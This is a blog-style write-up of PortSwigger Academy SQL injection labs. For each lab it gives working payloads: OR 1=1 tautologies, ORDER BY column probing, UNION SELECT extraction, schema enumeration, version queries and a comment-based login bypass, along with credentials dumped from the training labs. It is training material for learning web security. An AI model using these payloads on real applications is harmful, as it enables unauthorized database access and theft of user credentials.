---
title: "Portswigger Academy Notes: SQL Injection (SQLi)"
date: 2021-02-08 10:45:00 -0800
categories: [CTF, writeup]
tags: [writeup]
toc: true
---

# Basic SQLi

# TODO: ADD BlindSQL


## [LAB] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Solution: Go to categories and append the following to the URL.

```
' OR 1=1--
```

# Union

Used to select from a different table.

```
 This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

    How many columns are being returned from the original query?
    Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
```

To determine the number/type of columns, use ORDERBY.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Generally, you want to exfiltrate strings. So, you need to find something you can select that is a string.

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```

## [LAB] SQL injection UNION attack, determining the number of columns returned by the query

Goal: Determine number of columns returned by query.

Solution: Click on any of the categories. Notice category URL parameter.

```
' ORDER BY 3--
```

has no error.

```
' ORDER BY 4--
```

returns with an error. Therefore there are 3 columns.

Looking back at the description:

```
To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. 
```

I made the parameter this:

```
gifts' UNION SELECT null, null, null--
```

and solved the lab.

## [LAB] SQL injection UNION attack, finding a column containing text

Goal: Make the database retrieve the string: 'tSMY0l'

Solution: Append to URL:

```
' UNION SELECT null, 'kMjIj9', null--
```

## [LAB] Using an SQL injection UNION attack to retrieve interesting data

Goal: Login as Admin

Solution:

1) Find out how many columns.

```
https://accf1fd01e3e6c0e80c42b9c00c20075.web-security-academy.net/filter?category=Gifts' ORDER BY 2--
```

It errors out at 3, so there are two columns.

Now, union select to get credentials:

```
https://accf1fd01e3e6c0e80c42b9c00c20075.web-security-academy.net/filter?category=Gifts' UNION SELECT username, password from users--
```

Credentials:

```
administrator
86wv9v4ffbmurwkkn9sh
```

Login and lab is solved!

## [LAB] SQL injection UNION attack, retrieving multiple values in a single column

Goal: Get the values of 2 columns back with only one returning. uses concatenation.

Solution:

Find Columns:

```
https://accf1fd01e3e6c0e80c42b9c00c20075.web-security-academy.net/filter?category=Gifts' ORDER BY 2--
```

It errors out at 3, so there are two columns.

Only one can take a string. Use concat to get user/password.

```
' UNION SELECT null, username || '~' || password FROM users--
```

Results:

```
wiener~j49s12b1aejr8tkjkmh0
administrator~xnsfbdrf20auepib1e4q
carlos~jg4ionsnj09mzz4kgz62
```

Log in with admin credentials to finish the lab.


# Bypass

## [LAB] SQL injection vulnerability allowing login bypass

Goal: Login as administrator

Solution:

```
Username: administrator'--
Password: anything, it doesnt matter
```

Reason:
The query simply selects everything from administrator and the password check is commented out with ``--``. 

# Discover Table Names, Column Names, Database Information

```
SELECT * FROM information_schema.tables  -> List Tables
```

## [LAB] SQL injection attack, querying the database type and version on Oracle

SOLUTION

```
https://ac5c1fbb1f0a7a0780281838006100f0.web-security-academy.net/filter?category=Gifts' UNION SELECT BANNER, NULL FROM v$version--
```

```
' UNION SELECT BANNER, NULL FROM v$version--
```

## [LAB] SQL injection attack, querying the database type and version on MySQL and Microsoft

SOLUTION

```
' UNION SELECT NULL,@@version-- -
```

## [LAB] SQL injection attack, listing the database contents on non-Oracle databases

Goal: Figure out table names, column names, and dump credentials. Login as administrator.

Solution:

Figure out how many columns. Once you do that, query information_schema.tables to get the table name.

```
' UNION SELECT null, TABLE_NAME FROM information_schema.tables--
```

Notice interesting table ``users_kasudt``.

Get column names of interesting table.

```
' UNION SELECT null, COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_kasudt' --
```

Find the following columns:

```
username_jpfysl
password_bschpp
```

Now dump credentials.

```
' UNION SELECT username_jpfysl, password_bschpp FROM users_kasudt--
```

```
administrator
35e6fmdkxef6zuucbl0n
```

Login to complete the lab!

## [LAB] SQL injection attack, listing the database contents on Oracle

Given Information:

```
 On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying all_tables:

SELECT * FROM all_tables

And you can list columns by querying all_tab_columns:

SELECT * FROM all_tab_columns WHERE table_name = 'USERS' 
```

Goal: Login as administrator.

Solution:

Find table names:

```
' UNION SELECT null, table_name FROM all_tables--
```

```
USERS_CQRSFI
```

Find column names:

```
' UNION SELECT null, column_name FROM all_tab_columns WHERE table_name = 'USERS_CQRSFI'--
```


```
PASSWORD_VDPSOQ
USERNAME_LYGKEY
```

Now dump creds

```
' UNION SELECT PASSWORD_VDPSOQ, USERNAME_LYGKEY FROM USERS_CQRSFI--
```

```
administrator
jst42g9w9erz5dcp7ao8
```

Login to complete the lab :)

# Blind SQLi

## [LAB] Blind SQL injection with conditional responses





[Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)




